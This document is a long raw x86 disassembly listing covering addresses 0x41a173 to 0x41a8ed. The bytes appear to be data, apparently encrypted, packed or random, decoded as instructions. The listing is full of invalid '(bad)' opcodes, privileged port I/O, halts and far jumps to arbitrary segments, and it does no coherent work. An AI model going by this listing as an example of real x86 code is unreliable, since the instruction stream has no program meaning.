  41a173:	arpl   WORD PTR [edi-0x2f34035e],di
  41a179:	jb     0x41a1ef
  41a17b:	gs cmp dl,bl
  41a17e:	mov    ?,WORD PTR [ebp+0x77268ecd]
  41a184:	push   ebp
  41a185:	mov    ds:0x8c6fc638,eax
  41a18a:	push   edx
  41a18b:	sub    dl,BYTE PTR [esi+0x1b]
  41a18e:	sbb    al,0xa6
  41a190:	xchg   esi,eax
  41a191:	push   es
  41a192:	jp     0x41a1b5
  41a194:	xlat   BYTE PTR ds:[ebx]
  41a195:	jge    0x41a136
  41a197:	mov    ebx,0x502d32f3
  41a19c:	sub    BYTE PTR [ecx-0x45],al
  41a19f:	fs outs dx,BYTE PTR ss:[esi]
  41a1a2:	retf   0xfe01
  41a1a5:	adc    DWORD PTR [edx+0x8],edi
  41a1a8:	push   esi
  41a1a9:	in     al,dx
  41a1aa:	fld    DWORD PTR [edx-0x3]
  41a1ad:	out    0xe9,al
  41a1af:	outs   dx,BYTE PTR ss:[esi]
  41a1b1:	pop    ds
  41a1b2:	or     al,0x3d
  41a1b4:	out    0x5f,eax
  41a1b6:	sbb    bl,BYTE PTR [edx+0x1948adf6]
  41a1bc:	inc    esp
  41a1bd:	rol    BYTE PTR [esi],cl
  41a1bf:	cmp    BYTE PTR [ecx],dl
  41a1c1:	and    BYTE PTR [ebx],dl
  41a1c3:	mov    ebp,0x37d23e
  41a1c8:	mov    edx,0x610b175d
  41a1cd:	push   0x75
  41a1cf:	je     0x41a193
  41a1d1:	mov    al,0x10
  41a1d3:	adc    edi,DWORD PTR [edi-0x35]
  41a1d6:	lods   al,BYTE PTR ds:[esi]
  41a1d7:	int    0x70
  41a1d9:	xor    cl,BYTE PTR [ecx-0x12]
  41a1dc:	dec    ebp
  41a1dd:	push   ebx
  41a1de:	cmp    ch,BYTE PTR [ebp+0x61a93f29]
  41a1e4:	imul   esp,DWORD PTR [ebp+0x6925a74],0x575ee490
  41a1ee:	jmp    0xf214:0xce195621
  41a1f5:	or     ebx,DWORD PTR [edx+0x10]
  41a1f8:	dec    esi
  41a1f9:	sbb    DWORD PTR [edx+0x45],eax
  41a1fc:	(bad)  
  41a1fd:	pop    ss
  41a1fe:	push   esp
  41a1ff:	cmp    dl,BYTE PTR [ecx+0x37e045f2]
  41a205:	inc    edi
  41a206:	ret    
  41a207:	sbb    ah,ch
  41a209:	(bad)  
  41a20a:	nop
  41a20b:	jb     0x41a1e6
  41a20d:	push   ebp
  41a20e:	pop    es
  41a20f:	repz push es
  41a211:	or     BYTE PTR [esi+edi*8-0x50310e34],bl
  41a218:	sbb    ah,0x6c
  41a21b:	sbb    DWORD PTR [ebx+0x61],edi
  41a21e:	scas   eax,DWORD PTR es:[edi]
  41a21f:	push   cs
  41a220:	xchg   esp,eax
  41a221:	fst    DWORD PTR [edi-0x31]
  41a224:	jae    0x41a208
  41a226:	int3   
  41a227:	jno    0x41a1ea
  41a229:	jne    0x41a230
  41a22b:	add    eax,esp
  41a22d:	(bad)  
  41a22e:	rcl    DWORD PTR [ebx+0xb4380bc],1
  41a234:	cmp    cl,BYTE PTR [esi]
  41a236:	mov    ebp,0x480c6e1e
  41a23b:	fstp   TBYTE PTR [esi+eiz*2-0x17]
  41a23f:	shl    esp,cl
  41a241:	cld    
  41a242:	push   0x55b2b5cb
  41a247:	data16 add bl,bl
  41a24a:	mov    esp,DWORD PTR [edx+ecx*8+0x5d]
  41a24e:	fdiv   QWORD PTR [edi]
  41a250:	out    dx,eax
  41a251:	fs or  ah,bl
  41a254:	(bad)
  41a258:	jge    0x41a1f3
  41a25a:	retf   
  41a25b:	adc    eax,0x2bdac12c
  41a260:	dec    esi
  41a261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a262:	add    edi,DWORD PTR [ebx]
  41a264:	mov    BYTE PTR [edx],bl
  41a266:	icebp  
  41a267:	ins    DWORD PTR es:[edi],dx
  41a268:	out    dx,eax
  41a269:	lahf   
  41a26a:	enter  0x4511,0x2
  41a26e:	rol    DWORD PTR [ecx+esi*8+0x4a737960],0x21
  41a276:	fsubr  DWORD PTR [edx-0x29670f33]
  41a27c:	jge    0x41a2c8
  41a27e:	xchg   esi,eax
  41a27f:	adc    ebp,esi
  41a281:	aas    
  41a282:	jb     0x41a238
  41a284:	mov    dh,0x80
  41a286:	dec    esp
  41a287:	lock mov ecx,0xa36df2fa
  41a28d:	mov    bl,0xd7
  41a28f:	add    al,0x9b
  41a291:	push   esi
  41a292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a293:	sub    bl,bh
  41a295:	cmp    BYTE PTR [ecx+0x27],dh
  41a298:	stc    
  41a299:	out    dx,al
  41a29a:	scas   eax,DWORD PTR es:[edi]
  41a29b:	jl     0x41a316
  41a29d:	mov    ebx,0x5fa54a1
  41a2a2:	in     al,dx
  41a2a3:	mul    BYTE PTR [edi+eiz*4+0x7d]
  41a2a7:	call   0x29ec0a2a
  41a2ac:	cmp    BYTE PTR [ebp-0x34874b31],al
  41a2b2:	push   0x7d
  41a2b4:	xlat   BYTE PTR es:[ebx]
  41a2b6:	cmp    BYTE PTR [esi+ebx*4+0x19],0x5
  41a2bb:	rcr    BYTE PTR [eax+0x7],1
  41a2be:	int3   
  41a2bf:	cmp    eax,0x7ee9fce7
  41a2c4:	cmp    DWORD PTR [edx],ebx
  41a2c6:	push   esp
  41a2c7:	aas    
  41a2c8:	sub    cl,dh
  41a2ca:	xor    edi,DWORD PTR [esi-0x32]
  41a2cd:	ja     0x41a342
  41a2cf:	fldenv [esi+0x57]
  41a2d2:	or     eax,0xa4901d93
  41a2d7:	lods   al,BYTE PTR ds:[esi]
  41a2d8:	in     al,dx
  41a2d9:	das    
  41a2da:	aad    0x27
  41a2dc:	xlat   BYTE PTR ds:[ebx]
  41a2dd:	daa    
  41a2de:	out    dx,eax
  41a2df:	add    ah,BYTE PTR [ecx+0x24]
  41a2e2:	fisub  DWORD PTR [ebx]
  41a2e4:	sbb    dl,cl
  41a2e6:	into   
  41a2e7:	adc    eax,ebp
  41a2e9:	ret    0xa089
  41a2ec:	int3   
  41a2ed:	shl    DWORD PTR [ebp+0x4c],0x19
  41a2f1:	jecxz  0x41a313
  41a2f3:	or     DWORD PTR [edx],0x17
  41a2f6:	fwait
  41a2f7:	dec    esi
  41a2f8:	loopne 0x41a328
  41a2fa:	popf   
  41a2fb:	test   al,0xb1
  41a2fd:	stos   DWORD PTR es:[edi],eax
  41a2fe:	fild   DWORD PTR [ebx+0x4629bb0a]
  41a304:	pop    edx
  41a305:	xchg   edi,esi
  41a307:	xchg   BYTE PTR ds:0x31b55ea,bl
  41a30d:	daa    
  41a30e:	mov    dh,0x9c
  41a310:	add    ch,BYTE PTR [esi-0x7c]
  41a313:	inc    ebp
  41a314:	push   eax
  41a315:	je     0x41a33a
  41a317:	mov    al,ds:0xfba03f
  41a31c:	loop   0x41a36d
  41a31e:	sbb    ch,al
  41a320:	ds hlt 
  41a322:	outs   dx,DWORD PTR ds:[esi]
  41a323:	jp     0x41a2eb
  41a325:	stos   BYTE PTR es:[edi],al
  41a326:	daa    
  41a327:	and    BYTE PTR [edi+0x202ee061],dl
  41a32d:	mov    BYTE PTR [edx+0x7b8ea0e],bh
  41a333:	and    ebp,DWORD PTR [edx-0x6e]
  41a336:	dec    edx
  41a337:	mov    ecx,0xadcc8004
  41a33c:	rcr    BYTE PTR [edi],1
  41a33e:	or     al,0x32
  41a340:	dec    ebp
  41a341:	cmovl  edx,DWORD PTR [esi+0x20b745b1]
  41a348:	lods   eax,DWORD PTR ds:[esi]
  41a349:	jb     0x41a358
  41a34b:	jecxz  0x41a3a3
  41a34d:	push   ecx
  41a34e:	jmp    0xc76d299d
  41a353:	xor    eax,0xb235f7c6
  41a358:	xchg   ecx,eax
  41a359:	je     0x41a2e2
  41a35b:	out    dx,al
  41a35c:	add    eax,0x307a889c
  41a361:	sub    esp,DWORD PTR [edi]
  41a363:	dec    eax
  41a364:	xor    DWORD PTR [ecx+edx*4],0xffffffd3
  41a368:	daa    
  41a369:	ins    BYTE PTR es:[edi],dx
  41a36a:	jbe    0x41a2fc
  41a36c:	push   eax
  41a36d:	fxch   st(6)
  41a36f:	cmp    esp,DWORD PTR [ebp+0x41]
  41a372:	adc    al,0xd
  41a374:	leave  
  41a375:	or     dh,BYTE PTR [edx-0x4cf52c3a]
  41a37b:	xchg   esp,eax
  41a37c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a37d:	mov    esi,0x5e56bd8c
  41a382:	scas   al,BYTE PTR es:[edi]
  41a383:	data16 jecxz 0x41a39a
  41a386:	cwde   
  41a387:	adc    dh,BYTE PTR [ebx-0x7ad68958]
  41a38d:	cld    
  41a38e:	cmp    dh,BYTE PTR [esi+edx*4]
  41a391:	call   0x2258:0x5e999404
  41a398:	arpl   WORD PTR ds:0x9fb1e516,bp
  41a39e:	aad    0x2c
  41a3a0:	jg     0x41a398
  41a3a2:	cs jnp 0x41a417
  41a3a5:	js     0x41a34a
  41a3a7:	xchg   edi,eax
  41a3a8:	xchg   esp,edi
  41a3aa:	pop    esi
  41a3ab:	jecxz  0x41a341
  41a3ad:	ins    BYTE PTR es:[edi],dx
  41a3ae:	xor    eax,0x9c592175
  41a3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3b4:	repnz xor al,0xf3
  41a3b7:	pop    esi
  41a3b8:	dec    edx
  41a3b9:	js     0x41a34b
  41a3bb:	ja     0x41a3d0
  41a3bd:	imul   ecx,DWORD PTR [esi+0x38],0xffffffb3
  41a3c1:	inc    esi
  41a3c2:	jae    0x41a3cd
  41a3c4:	out    dx,al
  41a3c5:	mov    WORD PTR [ebx-0x57751115],cs
  41a3cb:	aaa    
  41a3cc:	xor    BYTE PTR [ebx],dh
  41a3ce:	dec    edx
  41a3cf:	push   esi
  41a3d0:	cmp    al,0xb3
  41a3d2:	test   DWORD PTR [edx-0x228f624a],0xe2f24854
  41a3dc:	rcl    BYTE PTR [ecx-0x67],0x2f
  41a3e0:	fisub  WORD PTR [esi-0x4db11122]
  41a3e6:	jmp    0xe3ee8d6d
  41a3eb:	adc    eax,0xc1754b09
  41a3f0:	pop    es
  41a3f1:	fsubr  DWORD PTR [ecx+0x31]
  41a3f4:	js     0x41a3b7
  41a3f6:	mov    edi,0xf4aa7518
  41a3fb:	lock jne 0x41a3df
  41a3fe:	sub    al,BYTE PTR [edx-0x6e906498]
  41a404:	push   cs
  41a405:	xchg   ebx,eax
  41a406:	push   ecx
  41a407:	pop    esp
  41a408:	repz adc al,dh
  41a40b:	lahf   
  41a40c:	mov    ebp,0xcd24fcdb
  41a411:	pop    esi
  41a412:	cmp    ebp,DWORD PTR [edi]
  41a414:	iret   
  41a415:	push   ebp
  41a416:	sbb    eax,0x2bb773fb
  41a41b:	ret    0xd45c
  41a41e:	test   eax,0xb79b6528
  41a423:	mov    eax,ds:0x5290aa69
  41a428:	mov    ah,BYTE PTR [edi]
  41a42a:	add    BYTE PTR [edi-0x38a53f89],cl
  41a430:	mov    eax,ds:0x5830c2c9
  41a435:	rcl    BYTE PTR [edx],cl
  41a437:	xchg   BYTE PTR [esi*1-0x2c482224],cl
  41a43e:	loopne 0x41a49a
  41a440:	mov    cl,0x9e
  41a442:	sub    bh,al
  41a444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a445:	mov    WORD PTR [ecx],cs
  41a447:	ret    0x94a9
  41a44a:	fbstp  TBYTE PTR [eax-0x51]
  41a44d:	mov    ah,0xc2
  41a44f:	mov    ah,bh
  41a451:	enter  0xc0cd,0x40
  41a455:	shl    DWORD PTR [ebx+0x32],0xfb
  41a459:	lods   eax,DWORD PTR ds:[esi]
  41a45a:	xchg   ecx,eax
  41a45b:	mov    al,ds:0xba86cbb2
  41a460:	mov    esi,0x651a7142
  41a465:	mov    esi,0x999f594f
  41a46a:	adc    dl,0x6f
  41a46d:	sti    
  41a46e:	lock push cs
  41a470:	dec    edi
  41a471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a472:	lds    eax,FWORD PTR [edi]
  41a474:	lahf   
  41a475:	mov    ds:0x8a683e20,eax
  41a47a:	call   0xd8ced8c4
  41a47f:	push   edx
  41a480:	inc    esp
  41a481:	mov    ebp,0x746ff02f
  41a486:	mov    ebx,0x377d7f76
  41a48b:	js     0x41a441
  41a48d:	and    esp,edi
  41a48f:	jmp    0x3600b7cb
  41a494:	cmp    al,0xa1
  41a496:	test   eax,0xf41ac7d7
  41a49b:	int    0xdd
  41a49d:	xchg   ecx,eax
  41a49e:	cdq    
  41a49f:	mov    ds:0x8cb2a2ed,al
  41a4a4:	mov    ch,0x1d
  41a4a6:	inc    eax
  41a4a7:	sbb    eax,0x355c296
  41a4ac:	push   esp
  41a4ad:	mov    eax,ds:0xbdc8985c
  41a4b2:	or     al,0xaa
  41a4b4:	push   ss
  41a4b5:	mov    cl,0x69
  41a4b7:	scas   eax,DWORD PTR es:[edi]
  41a4b8:	into   
  41a4b9:	inc    edi
  41a4ba:	xchg   edi,eax
  41a4bb:	mov    WORD PTR [esi-0x520c7e10],cs
  41a4c1:	in     al,0x42
  41a4c3:	aam    0x1b
  41a4c5:	in     al,0xd2
  41a4c7:	cdq    
  41a4c8:	adc    ah,dl
  41a4ca:	xchg   esp,eax
  41a4cb:	xchg   ebp,eax
  41a4cc:	scas   al,BYTE PTR es:[edi]
  41a4cd:	jns    0x41a49c
  41a4cf:	into   
  41a4d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4d1:	inc    ebx
  41a4d2:	out    0xd3,eax
  41a4d4:	les    eax,FWORD PTR [eax+edi*2]
  41a4d7:	sub    DWORD PTR [ebx],edi
  41a4d9:	adc    ebx,DWORD PTR [esi-0x33f0c1cd]
  41a4df:	in     al,dx
  41a4e0:	outs   dx,DWORD PTR ds:[esi]
  41a4e1:	push   ss
  41a4e2:	div    DWORD PTR [ebp+ebx*1-0x36]
  41a4e6:	lock cwde 
  41a4e8:	adc    BYTE PTR [esi-0x2],cl
  41a4eb:	jl     0x41a4a9
  41a4ed:	add    al,0x79
  41a4ef:	test   eax,0x9451dd04
  41a4f4:	daa    
  41a4f5:	or     ah,BYTE PTR [eax-0x7c1378b6]
  41a4fb:	ds mov bh,0xf4
  41a4fe:	pop    esp
  41a4ff:	mov    edx,0x5417b739
  41a504:	cmp    dh,BYTE PTR [edx+0x7e5e32ae]
  41a50a:	cmp    DWORD PTR [ebx-0x11],esp
  41a50d:	aaa    
  41a50e:	push   edi
  41a50f:	cmp    al,0xd3
  41a511:	jb     0x41a4fd
  41a513:	or     DWORD PTR [esi],ebx
  41a515:	adc    al,0xef
  41a517:	jmp    0x428b8290
  41a51c:	pop    ecx
  41a51d:	or     ebx,edx
  41a51f:	inc    ebx
  41a520:	xor    eax,0xeea7a6b1
  41a525:	popf   
  41a526:	(bad)  
  41a527:	xchg   edi,eax
  41a528:	and    eax,0xfa07d94d
  41a52d:	retf   0x94ab
  41a530:	pop    edi
  41a531:	push   esp
  41a532:	jg     0x41a532
  41a534:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41a536:	repz scas al,BYTE PTR es:[edi]
  41a538:	sub    edx,DWORD PTR [eax+0x3231883d]
  41a53e:	daa    
  41a53f:	pop    es
  41a540:	jb     0x41a4fc
  41a542:	gs cdq 
  41a544:	pop    ebp
  41a545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a546:	pop    es
  41a547:	loop   0x41a549
  41a549:	sti    
  41a54a:	test   al,0xf0
  41a54c:	hlt    
  41a54d:	outs   dx,DWORD PTR ds:[esi]
  41a54e:	push   eax
  41a54f:	test   dh,bl
  41a551:	pop    esp
  41a552:	mov    eax,ds:0x4b7260d7
  41a557:	push   ecx
  41a558:	popa   
  41a559:	lahf   
  41a55a:	ins    BYTE PTR es:[edi],dx
  41a55b:	add    edi,DWORD PTR [ebx+0x45]
  41a55e:	mov    ?,edx
  41a560:	adc    dh,BYTE PTR [ebx+0x7f]
  41a563:	xchg   edx,eax
  41a564:	ret    0xec76
  41a567:	mov    ds:0x83a1e474,al
  41a56c:	stc    
  41a56d:	mov    ds:0xa862b4a0,al
  41a572:	enter  0x6aa2,0x92
  41a576:	add    eax,eax
  41a578:	imul   eax,esi,0xffffffd6
  41a57b:	push   ebp
  41a57c:	es ret 
  41a57e:	fs test dl,cl
  41a581:	inc    ecx
  41a582:	cmp    al,0xa
  41a584:	sub    bl,dl
  41a586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a587:	push   esi
  41a588:	or     cl,BYTE PTR [esi+ecx*2]
  41a58b:	cmp    eax,0xe56b4f9e
  41a590:	mov    eax,ds:0xca74c02c
  41a595:	jp     0x41a5a4
  41a597:	sbb    ebp,DWORD PTR [ebp-0x45]
  41a59a:	mov    eax,0xe37ce51
  41a59f:	or     al,BYTE PTR [edx]
  41a5a1:	push   0x7d15aa95
  41a5a6:	into   
  41a5a7:	xor    eax,0x85e0abd6
  41a5ac:	cmp    BYTE PTR [edx-0x6f],0x0
  41a5b0:	adc    al,0x54
  41a5b2:	loop   0x41a536
  41a5b4:	or     BYTE PTR [ecx+eax*8-0x23],bh
  41a5b8:	pop    edi
  41a5b9:	xchg   DWORD PTR [ebx],esp
  41a5bb:	fs mov bl,0x20
  41a5be:	iret   
  41a5bf:	pop    edi
  41a5c0:	inc    edx
  41a5c1:	add    cl,BYTE PTR [ebp+0x63]
  41a5c4:	stos   BYTE PTR es:[edi],al
  41a5c5:	mov    eax,0x4ad86281
  41a5ca:	push   esi
  41a5cb:	aam    0xb5
  41a5cd:	mov    ds:0xf6b4af5a,eax
  41a5d2:	(bad)  
  41a5d3:	in     al,0xbe
  41a5d5:	push   esi
  41a5d6:	repz mov eax,0x77108184
  41a5dc:	(bad)
  41a5e1:	stos   BYTE PTR es:[edi],al
  41a5e2:	or     DWORD PTR [eax+0x48dc8ce5],esp
  41a5e8:	das    
  41a5e9:	cs (bad) 
  41a5eb:	mov    bh,0xae
  41a5ed:	icebp  
  41a5ee:	jmp    0x6455d835
  41a5f3:	pop    eax
  41a5f4:	add    DWORD PTR [ebx+0x44],0x5e17a545
  41a5fb:	sub    BYTE PTR [edi-0x2f0f7803],ch
  41a601:	fwait
  41a602:	sar    DWORD PTR [ecx+0xb4452f3],cl
  41a608:	inc    eax
  41a609:	pop    edx
  41a60a:	pop    ebp
  41a60c:	jno    0x41a5c6
  41a60e:	sub    DWORD PTR [esi+ebx*1-0x10],eax
  41a612:	mov    ebp,0xe3befd68
  41a617:	out    0x4d,al
  41a619:	shr    BYTE PTR [edi],0x7f
  41a61c:	push   ecx
  41a61d:	stc    
  41a61e:	pop    edx
  41a61f:	stc    
  41a620:	pop    ebx
  41a621:	sbb    al,BYTE PTR [esi]
  41a623:	scas   al,BYTE PTR es:[edi]
  41a624:	fsubr  DWORD PTR [ebx]
  41a626:	imul   edi,DWORD PTR [ecx],0x59
  41a629:	stc    
  41a62a:	lahf   
  41a62b:	jge    0x41a62c
  41a62d:	xor    eax,0xe83eddec
  41a632:	xchg   esi,eax
  41a633:	sbb    bh,bh
  41a635:	and    DWORD PTR [edx+0x22],eax
  41a638:	jae    0x41a671
  41a63a:	mov    bh,0x6a
  41a63c:	out    dx,eax
  41a63d:	mov    dh,0xd9
  41a63f:	ss inc esi
  41a641:	sub    al,0x87
  41a643:	fdivr  QWORD PTR [ebx-0x6becb022]
  41a649:	test   DWORD PTR [ecx+0x48],ecx
  41a64c:	pop    edi
  41a64d:	fs cmc 
  41a64f:	int    0x16
  41a651:	in     eax,dx
  41a652:	je     0x41a620
  41a654:	rcr    DWORD PTR [ebx-0x7a],cl
  41a657:	ds mov ecx,0x48a62d99
  41a65e:	add    al,0x47
  41a660:	imul   eax,DWORD PTR [ebp-0x5f],0x7c00eae
  41a667:	pop    edi
  41a668:	cs (bad) 
  41a66a:	mov    ah,0xc8
  41a66c:	mov    ds:0x697960e1,al
  41a671:	ss call 0x3a3f186
  41a677:	imul   esp,DWORD PTR ds:0x75cd7e25,0x4e
  41a67e:	add    eax,0x5c20f690
  41a683:	arpl   WORD PTR [esi-0x359ce7e9],di
  41a689:	and    BYTE PTR [esi-0x4833f7d9],dl
  41a68f:	inc    ebx
  41a690:	mov    esi,0x3bdaf01c
  41a695:	mov    eax,ds:0x838385b5
  41a69a:	xchg   ebp,eax
  41a69b:	lods   al,BYTE PTR ds:[esi]
  41a69c:	in     al,0xcf
  41a69e:	aad    0x36
  41a6a0:	cmp    bh,BYTE PTR [ebp+0x56b8e2a4]
  41a6a6:	jp     0x41a68b
  41a6a8:	cmc    
  41a6a9:	jb     0x41a645
  41a6ab:	cmp    ebx,ebp
  41a6ad:	scas   al,BYTE PTR es:[edi]
  41a6ae:	sbb    al,cl
  41a6b0:	mov    ds:0x91f0735e,eax
  41a6b5:	das    
  41a6b6:	jbe    0x41a71c
  41a6b8:	and    DWORD PTR [ecx+ebp*2+0x7a],0x1cb72ab2
  41a6c0:	sub    bl,ah
  41a6c2:	dec    edi
  41a6c3:	mov    BYTE PTR [edi+0x3b01ed69],dh
  41a6c9:	jp     0x41a726
  41a6cb:	push   ss
  41a6cc:	xchg   edx,eax
  41a6cd:	fucomi st,st(5)
  41a6cf:	call   0xa4357f0e
  41a6d4:	(bad)  
  41a6d5:	adc    BYTE PTR [eax-0x7a],bl
  41a6d8:	inc    esi
  41a6d9:	fdiv   DWORD PTR [ebx-0x87f6b08]
  41a6df:	push   ds
  41a6e0:	dec    ecx
  41a6e1:	mov    cl,0x26
  41a6e3:	retf   0xd670
  41a6e6:	push   eax
  41a6e7:	xlat   BYTE PTR ds:[ebx]
  41a6e8:	std    
  41a6e9:	push   esi
  41a6ea:	dec    ecx
  41a6eb:	pop    ebp
  41a6ec:	hlt    
  41a6ed:	ret    0x93b5
  41a6f0:	mov    edi,0xaa032299
  41a6f5:	cli    
  41a6f6:	pop    edi
  41a6f7:	mov    edx,DWORD PTR [esi-0x3d3d060a]
  41a6fd:	leave  
  41a6fe:	dec    ecx
  41a6ff:	and    BYTE PTR [eax-0x3],ch
  41a702:	mov    edx,0x4408c4d4
  41a707:	add    ecx,DWORD PTR [ebp+0x2b]
  41a70a:	mov    ecx,DWORD PTR [ebx+ebx*4]
  41a70d:	lods   al,BYTE PTR ds:[esi]
  41a70e:	(bad)  
  41a710:	jge    0x41a77d
  41a712:	pusha  
  41a713:	mov    eax,ds:0xf8eb4b33
  41a718:	daa    
  41a719:	mov    ds:0x468744fd,al
  41a71e:	dec    ebp
  41a71f:	xor    BYTE PTR ds:0xb7cebd92,dh
  41a725:	mov    esi,0xe37f245
  41a72a:	dec    ebx
  41a72b:	mov    esi,0x71c68a0f
  41a730:	sbb    eax,0xe2b5ecb6
  41a735:	cwde   
  41a736:	jmp    0x41a75a
  41a738:	jne    0x41a6d1
  41a73a:	sbb    eax,0x3f03a645
  41a73f:	push   ds
  41a740:	xchg   esp,eax
  41a741:	test   BYTE PTR [edi-0x3fe9680a],cl
  41a747:	inc    ebp
  41a748:	ss or  eax,0x1d0f9f52
  41a74e:	ds push esi
  41a750:	dec    eax
  41a751:	mov    esp,ebx
  41a753:	imul   ecx,DWORD PTR ds:0xa813e4b8,0x79b7725e
  41a75d:	mov    ch,0x1a
  41a75f:	sub    eax,0x4738d501
  41a764:	dec    DWORD PTR [esi-0x41]
  41a767:	jmp    0x6814:0x4b952d19
  41a76e:	xchg   edx,eax
  41a76f:	adc    edx,0x60
  41a772:	pop    eax
  41a773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a776:	daa    
  41a777:	pop    edx
  41a778:	sti    
  41a779:	(bad)  
  41a77a:	fistp  QWORD PTR [edi+0x17]
  41a77d:	mov    WORD PTR [edx],ds
  41a77f:	cmp    eax,0x5c11c561
  41a784:	sub    BYTE PTR ds:0x61f9b973,al
  41a78a:	call   0x88d:0x4d21c31a
  41a791:	and    BYTE PTR [edi],bh
  41a793:	pop    edi
  41a794:	dec    edx
  41a795:	hlt    
  41a796:	mov    bh,BYTE PTR [esi-0x7e]
  41a799:	mov    edi,DWORD PTR [ebx+0x1]
  41a79c:	mov    bl,0x8c
  41a79e:	rol    BYTE PTR [edi+0x14],1
  41a7a1:	stos   BYTE PTR es:[edi],al
  41a7a2:	mov    esi,0x7a03cefa
  41a7a7:	cmc    
  41a7a8:	jmp    0x3f7e5eba
  41a7ad:	retf   
  41a7ae:	jmp    0x55e4fa02
  41a7b3:	cmp    BYTE PTR [eax],bh
  41a7b5:	pusha  
  41a7b6:	or     cl,BYTE PTR [esp+edi*2]
  41a7b9:	mov    esp,0xc55ef7f1
  41a7be:	ss jne 0x41a799
  41a7c1:	mov    ch,0xe9
  41a7c3:	int    0x23
  41a7c5:	mov    bh,0x3d
  41a7c7:	sub    bh,BYTE PTR [eax-0x330212e3]
  41a7cd:	jbe    0x41a7b7
  41a7cf:	xchg   BYTE PTR [ebx+0x1f],bl
  41a7d2:	dec    esi
  41a7d3:	sub    ebx,0xaf5c2617
  41a7d9:	hlt    
  41a7da:	sbb    ah,BYTE PTR [edi]
  41a7dc:	pop    DWORD PTR [eax-0x64323f8a]
  41a7e2:	mov    bh,0x3a
  41a7e4:	repnz xchg esi,eax
  41a7e6:	call   0xfd29:0x9544f365
  41a7ed:	jmp    0x4890:0xe609dce4
  41a7f4:	cld    
  41a7f5:	shr    eax,0x19
  41a7f8:	imul   edi,DWORD PTR [ecx+eax*2+0x55],0xdb56fe
  41a800:	in     al,dx
  41a801:	lds    eax,FWORD PTR [esi-0x29]
  41a804:	inc    ebp
  41a805:	cli    
  41a806:	out    dx,eax
  41a807:	xor    BYTE PTR [eax],dh
  41a809:	cmp    al,0xc0
  41a80b:	addr16 mov al,ds:0x8cb4
  41a80f:	shr    DWORD PTR [edx],0xec
  41a812:	jp     0x41a7e0
  41a814:	xchg   edx,eax
  41a815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a816:	dec    esi
  41a817:	call   ecx
  41a819:	dec    edi
  41a81a:	dec    eax
  41a81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a81c:	js     0x41a870
  41a81e:	jne    0x41a83f
  41a820:	rol    BYTE PTR ds:0x1f680856,cl
  41a826:	dec    esi
  41a827:	mov    edi,0x66f68f01
  41a82c:	out    dx,eax
  41a82d:	xchg   ebp,eax
  41a82e:	dec    ecx
  41a82f:	enter  0x31dc,0xf0
  41a833:	jns    0x41a814
  41a835:	inc    esi
  41a836:	lods   eax,DWORD PTR ds:[esi]
  41a837:	popf   
  41a838:	or     edx,DWORD PTR ds:0xbf1ec723
  41a83f:	bound  edx,QWORD PTR [ebx-0x27]
  41a842:	xchg   edx,eax
  41a843:	fldenv [eax+0x48]
  41a846:	dec    DWORD PTR [ebp+0x30]
  41a849:	and    al,0xeb
  41a84b:	lock fmul QWORD PTR [eax+edi*1-0x2656e331]
  41a853:	mov    al,0x99
  41a855:	ds pop ds
  41a857:	(bad)  
  41a858:	(bad)  [edx-0x2e1217e7]
  41a85e:	mov    bl,0x98
  41a860:	lahf   
  41a861:	push   ds
  41a862:	daa    
  41a863:	fucomi st,st(0)
  41a865:	jmp    0x354aa352
  41a86a:	sahf   
  41a86b:	inc    ebp
  41a86c:	pop    eax
  41a86d:	xchg   ebp,eax
  41a86e:	pop    edx
  41a86f:	scas   al,BYTE PTR es:[edi]
  41a870:	(bad)  
  41a871:	aaa    
  41a872:	push   edx
  41a873:	inc    ecx
  41a874:	sub    BYTE PTR [edx+0x27],cl
  41a877:	cmp    eax,0x2b253593
  41a87c:	xchg   BYTE PTR [ecx-0x4a],dl
  41a87f:	nop
  41a880:	push   ds
  41a881:	aam    0x8b
  41a883:	mov    esp,0x8a315dc1
  41a888:	xchg   DWORD PTR [edx-0x7c],esi
  41a88b:	aad    0xd0
  41a88d:	neg    dh
  41a88f:	pop    esi
  41a890:	es jp  0x41a8d7
  41a893:	mov    ah,bl
  41a895:	sbb    bh,0x2b
  41a898:	xor    BYTE PTR [ebp-0x2e],dh
  41a89b:	mov    DWORD PTR [ebp+0x4505d509],0xab798f27
  41a8a5:	jmp    0x41a86c
  41a8a7:	or     al,0x32
  41a8a9:	push   es
  41a8aa:	or     esp,DWORD PTR [ebx+0x350f1424]
  41a8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8b1:	mov    eax,0x1c398931
  41a8b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b7:	pop    ebx
  41a8b8:	pop    esi
  41a8b9:	lea    esi,[esi+0x1d]
  41a8bc:	outs   dx,DWORD PTR ds:[esi]
  41a8bd:	pushf  
  41a8be:	xor    DWORD PTR [ebp-0x9],ebx
  41a8c1:	popf   
  41a8c2:	fcom   DWORD PTR [eax]
  41a8c4:	dec    eax
  41a8c5:	cmp    BYTE PTR [eax],ah
  41a8c7:	test   al,0xb3
  41a8c9:	jmp    0x65c342a3
  41a8ce:	repz mov ecx,0x8827e708
  41a8d4:	cs jg  0x41a863
  41a8d7:	popf   
  41a8d8:	add    eax,0x5407bf1f
  41a8dd:	leave  
  41a8de:	(bad)  
  41a8e0:	cdq    
  41a8e1:	imul   ebp,DWORD PTR [edx],0xffffffe6
  41a8e4:	rcl    cl,0xd
  41a8e7:	fdivrp st(3),st
  41a8e9:	push   ebx
  41a8ea:	leave  
  41a8eb:	jne    0x41a885
  41a8ed:	imul   eax,DWORD PTR [ebx+0x535605c2],0xce74507
